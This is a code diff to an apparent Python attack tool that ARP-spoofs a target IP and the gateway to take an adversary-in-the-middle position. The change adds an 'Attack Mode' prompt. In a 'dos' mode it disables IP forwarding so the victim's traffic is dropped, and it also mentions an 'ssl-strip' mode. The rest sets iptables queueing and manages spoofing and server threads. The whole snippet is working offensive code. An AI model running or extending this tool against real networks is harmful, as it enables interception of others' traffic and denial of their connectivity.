@@ -24,8 +24,17 @@ def main():
     target_ip = input("\nTarget IP: ")
     gateway_ip = get_default_gateway_ip()
 
-    # Enable ip_forwarding
-    set_ip_forwarding(True)
+    # Ask for attack mode
+    mode = ""
+    if "dos" not in mode or "ssl-strip" not in mode:
+        mode = input("Attack Mode: ")
+
+    # Enable/Disable ip_forwarding based on mode
+    if "dos" in mode.lower(): 
+        set_ip_forwarding(False)
+        server.stop()
+    else: set_ip_forwarding(True)
+
     print(f"\nSet ipForwarding: {get_ip_forwarding()}\n")
 
     # Enable queueing rule in iptables
@@ -39,16 +48,16 @@ def main():
         spoof_thread.start()
 
         # Continue main thread...
-        print("\nContinue...")
+        print("\nContinuing...")
 
         # Rejoin all threads to main thread
-        server_thread.join()
+        if "dos" not in mode.lower(): server_thread.join()
         spoof_thread.join()
 
     except KeyboardInterrupt:
         # Restore ARP tables and remove the AITM position
         arp_spoofer.cleanup(gateway_ip, target_ip)
-        server.stop()
+        if "dos" not in mode.lower(): server.stop()
         
         # Disable IP_Forwarding (Default)
         set_ip_forwarding(False)
